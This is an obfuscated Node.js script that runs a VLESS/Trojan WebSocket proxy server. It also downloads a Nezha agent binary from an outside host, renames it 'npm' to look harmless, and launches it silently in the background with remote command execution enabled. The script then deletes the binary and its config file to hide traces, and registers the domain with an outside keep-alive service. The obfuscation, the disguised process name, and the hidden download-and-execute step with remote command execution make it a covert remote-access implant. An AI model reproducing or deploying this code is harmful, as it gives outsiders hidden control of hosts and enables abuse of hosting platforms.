const _0x164c34=_0x3725;(function(_0xf5291f,_0x214821){const _0x960159=_0x3725,_0x237de8=_0xf5291f();while(!![]){try{const _0x403085=-parseInt(_0x960159(0x14c))/0x1+parseInt(_0x960159(0x15d))/0x2+-parseInt(_0x960159(0x167))/0x3*(-parseInt(_0x960159(0x139))/0x4)+-parseInt(_0x960159(0x10d))/0x5+parseInt(_0x960159(0x103))/0x6+-parseInt(_0x960159(0xe9))/0x7+parseInt(_0x960159(0xfe))/0x8;if(_0x403085===_0x214821)break;else _0x237de8['push'](_0x237de8['shift']());}catch(_0x5d9f50){_0x237de8['push'](_0x237de8['shift']());}}}(_0x3344,0x201d7));function _0x3344(){const _0x41824c=['every','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',':443?security=tls&sni=','Hello\x20world!','stream','slice','1049808pSQVAe','&type=A','unlink','country','once','1041174vWVvQX','Automatic\x20Access\x20Task\x20added\x20successfully','arm64','npm\x20running\x20error:','2096','AUTO_ACCESS','createServer','2083','find','reduce','226155bswnEm','8.8.4.4','Unknown','client_secret:\x20','finish','readUInt16BE','setsid\x20nohup\x20./npm\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','test','net','createHash','sub','digest','npm\x20is\x20running','toString','end','crypto','1234.abc.com','Answer','pop','&fp=chrome&type=ws&host=','https://dns.google/resolve?name=','then','/bin/bash','utf8','arm','PORT','write','map','8443','update','split','Failed\x20to\x20resolve\x20','false','npm','url','NAME','log','path','Hug','WSPATH','writeHead','SUB_PATH','156fYoulb','1.1.1.1','error','https://','post','--tls','Server\x20is\x20running\x20on\x20port\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','readFile','\x20with\x20all\x20DNS\x20servers','NEZHA_PORT','&path=%2F','NEZHA_KEY','arch','substr','child_process','data','https://amd64.ssss.nyc.mn/v1','Status','135523IUrTVa','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','get','connect','includes','\x20-p\x20','sha224','readUInt8','catch','application/dns-json','text/html','writeFileSync','http','Server','base64','connection','30584yLgbuC','2053','error:\x20','join','text/plain','12f81010-fd06-4562-b933-819b14be2831','pipe','replace','concat','DOMAIN','16287CAGmNS','utf-8','1536367wrYqkW','NEZHA_SERVER','https://amd64.ssss.nyc.mn/agent','env','Not\x20Found\x0a','vless://','trojan://','send','config.yaml','buffer','https://arm64.ssss.nyc.mn/agent','length','443','decode','trim'];_0x3344=function(){return _0x41824c;};return _0x3344();}const os=require('os'),http=require(_0x164c34(0x159)),fs=require('fs'),axios=require('axios'),net=require(_0x164c34(0x117)),path=require(_0x164c34(0x134)),crypto=require(_0x164c34(0x11e)),{Buffer}=require(_0x164c34(0xf2)),{exec,execSync}=require(_0x164c34(0x148)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x164c34(0x162),NEZHA_SERVER=process[_0x164c34(0xec)][_0x164c34(0xea)]||'',NEZHA_PORT=process['env'][_0x164c34(0x143)]||'',NEZHA_KEY=process[_0x164c34(0xec)][_0x164c34(0x145)]||'',DOMAIN=process[_0x164c34(0xec)][_0x164c34(0x166)]||_0x164c34(0x11f),AUTO_ACCESS=process[_0x164c34(0xec)][_0x164c34(0x108)]||!![],WSPATH=process[_0x164c34(0xec)][_0x164c34(0x136)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x164c34(0x138)]||_0x164c34(0x119),NAME=process['env'][_0x164c34(0x132)]||_0x164c34(0x135),PORT=process[_0x164c34(0xec)][_0x164c34(0x128)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2da25b=_0x164c34;try{const _0x47b398=await axios['get']('https://speed.cloudflare.com/meta'),_0x207646=_0x47b398[_0x2da25b(0x149)];ISP=(_0x207646[_0x2da25b(0x101)]+'-'+_0x207646['asOrganization'])[_0x2da25b(0x164)](/ /g,'_');}catch(_0x4f5fb0){ISP=_0x2da25b(0x10f);}};GetISP();const httpServer=http[_0x164c34(0x109)]((_0x5da7fb,_0x53d23c)=>{const _0x4da3ba=_0x164c34;if(_0x5da7fb[_0x4da3ba(0x131)]==='/'){const _0x5d90da=path[_0x4da3ba(0x160)](__dirname,'index.html');fs[_0x4da3ba(0x141)](_0x5d90da,_0x4da3ba(0x126),(_0x3f9d34,_0x52f95a)=>{const _0x47cf64=_0x4da3ba;if(_0x3f9d34){_0x53d23c['writeHead'](0xc8,{'Content-Type':_0x47cf64(0x157)}),_0x53d23c[_0x47cf64(0x11d)](_0x47cf64(0xfb));return;}_0x53d23c[_0x47cf64(0x137)](0xc8,{'Content-Type':_0x47cf64(0x157)}),_0x53d23c[_0x47cf64(0x11d)](_0x52f95a);});return;}else{if(_0x5da7fb[_0x4da3ba(0x131)]==='/'+SUB_PATH){const _0x3e3e7d=_0x4da3ba(0xee)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4da3ba(0x122)+DOMAIN+_0x4da3ba(0x144)+WSPATH+'#'+NAME+'-'+ISP,_0x3e3987=_0x4da3ba(0xef)+UUID+'@'+DOMAIN+_0x4da3ba(0xfa)+DOMAIN+_0x4da3ba(0x122)+DOMAIN+_0x4da3ba(0x144)+WSPATH+'#'+NAME+'-'+ISP,_0x72650f=_0x3e3e7d+'\x0a'+_0x3e3987,_0x3d6445=Buffer['from'](_0x72650f)[_0x4da3ba(0x11c)](_0x4da3ba(0x15b));_0x53d23c[_0x4da3ba(0x137)](0xc8,{'Content-Type':_0x4da3ba(0x161)}),_0x53d23c[_0x4da3ba(0x11d)](_0x3d6445+'\x0a');}else _0x53d23c[_0x4da3ba(0x137)](0x194,{'Content-Type':_0x4da3ba(0x161)}),_0x53d23c[_0x4da3ba(0x11d)](_0x4da3ba(0xed));}}),wss=new WebSocket[(_0x164c34(0x15a))]({'server':httpServer}),uuid=UUID[_0x164c34(0x164)](/-/g,''),DNS_SERVERS=[_0x164c34(0x10e),_0x164c34(0x13a)];function resolveHost(_0x2e47af){return new Promise((_0xaa883b,_0x506379)=>{const _0x349036=_0x3725;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x349036(0x116)](_0x2e47af)){_0xaa883b(_0x2e47af);return;}let _0x4f8c3b=0x0;function _0x321269(){const _0x3cd81a=_0x349036;if(_0x4f8c3b>=DNS_SERVERS[_0x3cd81a(0xf4)]){_0x506379(new Error(_0x3cd81a(0x12e)+_0x2e47af+_0x3cd81a(0x142)));return;}const _0x2966e6=DNS_SERVERS[_0x4f8c3b];_0x4f8c3b++;const _0x5d3878=_0x3cd81a(0x123)+encodeURIComponent(_0x2e47af)+_0x3cd81a(0xff);axios[_0x3cd81a(0x14f)](_0x5d3878,{'timeout':0x1388,'headers':{'Accept':_0x3cd81a(0x156)}})['then'](_0x510197=>{const _0x41d2d9=_0x3cd81a,_0x535d6b=_0x510197[_0x41d2d9(0x149)];if(_0x535d6b[_0x41d2d9(0x14b)]===0x0&&_0x535d6b['Answer']&&_0x535d6b['Answer']['length']>0x0){const _0x28c8e5=_0x535d6b[_0x41d2d9(0x120)][_0x41d2d9(0x10b)](_0x979ed5=>_0x979ed5['type']===0x1);if(_0x28c8e5){_0xaa883b(_0x28c8e5[_0x41d2d9(0x149)]);return;}}_0x321269();})[_0x3cd81a(0x155)](_0x1cec87=>{_0x321269();});}_0x321269();});}function handleVlessConnection(_0x2256f2,_0x3dbfd9){const _0x50da86=_0x164c34,[_0x1d4bb1]=_0x3dbfd9,_0x1c1255=_0x3dbfd9['slice'](0x1,0x11);if(!_0x1c1255[_0x50da86(0xf8)]((_0x4f1db8,_0x34f49a)=>_0x4f1db8==parseInt(uuid[_0x50da86(0x147)](_0x34f49a*0x2,0x2),0x10)))return![];let _0x62315f=_0x3dbfd9['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x5aa36d=_0x3dbfd9['slice'](_0x62315f,_0x62315f+=0x2)[_0x50da86(0x112)](0x0),_0x3b9077=_0x3dbfd9[_0x50da86(0xfd)](_0x62315f,_0x62315f+=0x1)[_0x50da86(0x154)](),_0x5de7e6=_0x3b9077==0x1?_0x3dbfd9[_0x50da86(0xfd)](_0x62315f,_0x62315f+=0x4)[_0x50da86(0x160)]('.'):_0x3b9077==0x2?new TextDecoder()[_0x50da86(0xf6)](_0x3dbfd9[_0x50da86(0xfd)](_0x62315f+0x1,_0x62315f+=0x1+_0x3dbfd9[_0x50da86(0xfd)](_0x62315f,_0x62315f+0x1)[_0x50da86(0x154)]())):_0x3b9077==0x3?_0x3dbfd9[_0x50da86(0xfd)](_0x62315f,_0x62315f+=0x10)[_0x50da86(0x10c)]((_0x2d2d71,_0x5e3ce3,_0x181931,_0x24dccb)=>_0x181931%0x2?_0x2d2d71[_0x50da86(0x165)](_0x24dccb[_0x50da86(0xfd)](_0x181931-0x1,_0x181931+0x1)):_0x2d2d71,[])[_0x50da86(0x12a)](_0x2092de=>_0x2092de['readUInt16BE'](0x0)[_0x50da86(0x11c)](0x10))[_0x50da86(0x160)](':'):'';_0x2256f2[_0x50da86(0xf0)](new Uint8Array([_0x1d4bb1,0x0]));const _0xe83193=createWebSocketStream(_0x2256f2);return resolveHost(_0x5de7e6)[_0x50da86(0x124)](_0x4b2213=>{const _0x3e3639=_0x50da86;net[_0x3e3639(0x150)]({'host':_0x4b2213,'port':_0x5aa36d},function(){const _0x1cce66=_0x3e3639;this[_0x1cce66(0x129)](_0x3dbfd9[_0x1cce66(0xfd)](_0x62315f)),_0xe83193['on']('error',()=>{})[_0x1cce66(0x163)](this)['on'](_0x1cce66(0x13b),()=>{})[_0x1cce66(0x163)](_0xe83193);})['on'](_0x3e3639(0x13b),()=>{});})['catch'](_0x2d7457=>{const _0x2fceda=_0x50da86;net['connect']({'host':_0x5de7e6,'port':_0x5aa36d},function(){const _0x43839c=_0x3725;this[_0x43839c(0x129)](_0x3dbfd9[_0x43839c(0xfd)](_0x62315f)),_0xe83193['on'](_0x43839c(0x13b),()=>{})[_0x43839c(0x163)](this)['on'](_0x43839c(0x13b),()=>{})[_0x43839c(0x163)](_0xe83193);})['on'](_0x2fceda(0x13b),()=>{});}),!![];}function handleTrojanConnection(_0x5baacf,_0x5424e4){const _0x515d39=_0x164c34;try{if(_0x5424e4[_0x515d39(0xf4)]<0x3a)return![];const _0xb62389=_0x5424e4[_0x515d39(0xfd)](0x0,0x38)[_0x515d39(0x11c)](),_0x365f38=[UUID];let _0x5e0296=null;for(const _0x4b42e6 of _0x365f38){const _0x289b30=crypto[_0x515d39(0x118)](_0x515d39(0x153))[_0x515d39(0x12c)](_0x4b42e6)[_0x515d39(0x11a)]('hex');if(_0x289b30===_0xb62389){_0x5e0296=_0x4b42e6;break;}}if(!_0x5e0296)return![];let _0x1107df=0x38;_0x5424e4[_0x1107df]===0xd&&_0x5424e4[_0x1107df+0x1]===0xa&&(_0x1107df+=0x2);const _0x3db51a=_0x5424e4[_0x1107df];if(_0x3db51a!==0x1)return![];_0x1107df+=0x1;const _0x1f2107=_0x5424e4[_0x1107df];_0x1107df+=0x1;let _0x565f0a,_0x3421d4;if(_0x1f2107===0x1)_0x565f0a=_0x5424e4['slice'](_0x1107df,_0x1107df+0x4)[_0x515d39(0x160)]('.'),_0x1107df+=0x4;else{if(_0x1f2107===0x3){const _0x3b73de=_0x5424e4[_0x1107df];_0x1107df+=0x1,_0x565f0a=_0x5424e4[_0x515d39(0xfd)](_0x1107df,_0x1107df+_0x3b73de)[_0x515d39(0x11c)](),_0x1107df+=_0x3b73de;}else{if(_0x1f2107===0x4)_0x565f0a=_0x5424e4[_0x515d39(0xfd)](_0x1107df,_0x1107df+0x10)[_0x515d39(0x10c)]((_0x392815,_0x5d13c0,_0x57cc05,_0xdb02aa)=>_0x57cc05%0x2?_0x392815['concat'](_0xdb02aa['slice'](_0x57cc05-0x1,_0x57cc05+0x1)):_0x392815,[])[_0x515d39(0x12a)](_0x408cf9=>_0x408cf9[_0x515d39(0x112)](0x0)[_0x515d39(0x11c)](0x10))[_0x515d39(0x160)](':'),_0x1107df+=0x10;else return![];}}_0x3421d4=_0x5424e4['readUInt16BE'](_0x1107df),_0x1107df+=0x2;_0x1107df<_0x5424e4[_0x515d39(0xf4)]&&_0x5424e4[_0x1107df]===0xd&&_0x5424e4[_0x1107df+0x1]===0xa&&(_0x1107df+=0x2);const _0x2dd434=createWebSocketStream(_0x5baacf);return resolveHost(_0x565f0a)[_0x515d39(0x124)](_0x2a1903=>{const _0x49b261=_0x515d39;net['connect']({'host':_0x2a1903,'port':_0x3421d4},function(){const _0x1b9b81=_0x3725;_0x1107df<_0x5424e4[_0x1b9b81(0xf4)]&&this[_0x1b9b81(0x129)](_0x5424e4[_0x1b9b81(0xfd)](_0x1107df)),_0x2dd434['on'](_0x1b9b81(0x13b),()=>{})[_0x1b9b81(0x163)](this)['on']('error',()=>{})[_0x1b9b81(0x163)](_0x2dd434);})['on'](_0x49b261(0x13b),()=>{});})[_0x515d39(0x155)](_0x1058ed=>{const _0x4d483a=_0x515d39;net[_0x4d483a(0x150)]({'host':_0x565f0a,'port':_0x3421d4},function(){const _0x148e08=_0x4d483a;_0x1107df<_0x5424e4['length']&&this[_0x148e08(0x129)](_0x5424e4['slice'](_0x1107df)),_0x2dd434['on']('error',()=>{})[_0x148e08(0x163)](this)['on'](_0x148e08(0x13b),()=>{})[_0x148e08(0x163)](_0x2dd434);})['on'](_0x4d483a(0x13b),()=>{});}),!![];}catch(_0x47e6c2){return![];}}wss['on'](_0x164c34(0x15c),(_0x58adb0,_0x5972c8)=>{const _0x4fbfcb=_0x164c34,_0x45a22e=_0x5972c8[_0x4fbfcb(0x131)]||'';_0x58adb0[_0x4fbfcb(0x102)]('message',_0x15aaaf=>{const _0x19bf24=_0x4fbfcb;if(_0x15aaaf[_0x19bf24(0xf4)]>0x11&&_0x15aaaf[0x0]===0x0){const _0xdcb56c=_0x15aaaf[_0x19bf24(0xfd)](0x1,0x11),_0x2a466b=_0xdcb56c['every']((_0x245294,_0x362817)=>_0x245294==parseInt(uuid['substr'](_0x362817*0x2,0x2),0x10));if(_0x2a466b){!handleVlessConnection(_0x58adb0,_0x15aaaf)&&_0x58adb0['close']();return;}}!handleTrojanConnection(_0x58adb0,_0x15aaaf)&&_0x58adb0['close']();})['on'](_0x4fbfcb(0x13b),()=>{});});function _0x3725(_0xf69c10,_0x1e1119){const _0x334405=_0x3344();return _0x3725=function(_0x3725ec,_0x4dfd1e){_0x3725ec=_0x3725ec-0xe9;let _0x4f557d=_0x334405[_0x3725ec];return _0x4f557d;},_0x3725(_0xf69c10,_0x1e1119);}const getDownloadUrl=()=>{const _0x56a003=_0x164c34,_0x3e84e7=os[_0x56a003(0x146)]();return _0x3e84e7===_0x56a003(0x127)||_0x3e84e7===_0x56a003(0x105)||_0x3e84e7==='aarch64'?!NEZHA_PORT?_0x56a003(0x14e):_0x56a003(0xf3):!NEZHA_PORT?_0x56a003(0x14a):_0x56a003(0xeb);},downloadFile=async()=>{const _0x2422cc=_0x164c34;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3406eb=getDownloadUrl(),_0x40c611=await axios({'method':_0x2422cc(0x14f),'url':_0x3406eb,'responseType':_0x2422cc(0xfc)}),_0x571727=fs['createWriteStream'](_0x2422cc(0x130));return _0x40c611['data'][_0x2422cc(0x163)](_0x571727),new Promise((_0x1aaa96,_0x3208c1)=>{const _0x22a9aa=_0x2422cc;_0x571727['on'](_0x22a9aa(0x111),()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x1a580c=>{if(_0x1a580c)_0x3208c1(_0x1a580c);_0x1aaa96();});}),_0x571727['on'](_0x22a9aa(0x13b),_0x3208c1);});}catch(_0x311e31){throw _0x311e31;}},runnz=async()=>{const _0x488086=_0x164c34;try{const _0x510a2d=execSync(_0x488086(0xf9),{'encoding':_0x488086(0x168)});if(_0x510a2d[_0x488086(0xf7)]()!==''){console[_0x488086(0x133)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x15479e){}await downloadFile();let _0x39f7a2='',_0x4868d8=[_0x488086(0xf5),_0x488086(0x12b),_0x488086(0x107),'2087',_0x488086(0x10a),_0x488086(0x15e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1a17cc=_0x4868d8[_0x488086(0x151)](NEZHA_PORT)?_0x488086(0x13e):'';_0x39f7a2=_0x488086(0x113)+NEZHA_SERVER+':'+NEZHA_PORT+_0x488086(0x152)+NEZHA_KEY+'\x20'+_0x1a17cc+_0x488086(0x14d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x18b2af=NEZHA_SERVER[_0x488086(0x151)](':')?NEZHA_SERVER[_0x488086(0x12d)](':')[_0x488086(0x121)]():'',_0x34c503=_0x4868d8[_0x488086(0x151)](_0x18b2af)?'true':_0x488086(0x12f),_0x25eeea=_0x488086(0x110)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x34c503+_0x488086(0x114)+UUID;fs[_0x488086(0x158)](_0x488086(0xf1),_0x25eeea);}_0x39f7a2=_0x488086(0x115);}else{console[_0x488086(0x133)](_0x488086(0x140));return;}}try{exec(_0x39f7a2,{'shell':_0x488086(0x125)},_0xc46345=>{const _0x287e32=_0x488086;if(_0xc46345)console[_0x287e32(0x13b)](_0x287e32(0x106),_0xc46345);else console[_0x287e32(0x133)](_0x287e32(0x11b));});}catch(_0x205b47){console[_0x488086(0x13b)](_0x488086(0x15f)+_0x205b47);}};async function addAccessTask(){const _0x2a8fa4=_0x164c34;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2602ce=_0x2a8fa4(0x13c)+DOMAIN;try{const _0x49ad74=await axios[_0x2a8fa4(0x13d)]('https://oooo.serv00.net/add-url',{'url':_0x2602ce},{'headers':{'Content-Type':'application/json'}});console[_0x2a8fa4(0x133)](_0x2a8fa4(0x104));}catch(_0x3a638b){}}const delFiles=()=>{const _0x32fe94=_0x164c34;fs[_0x32fe94(0x100)](_0x32fe94(0x130),()=>{}),fs[_0x32fe94(0x100)](_0x32fe94(0xf1),()=>{});};httpServer['listen'](PORT,()=>{const _0x36cda0=_0x164c34;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x36cda0(0x133)](_0x36cda0(0x13f)+PORT);});
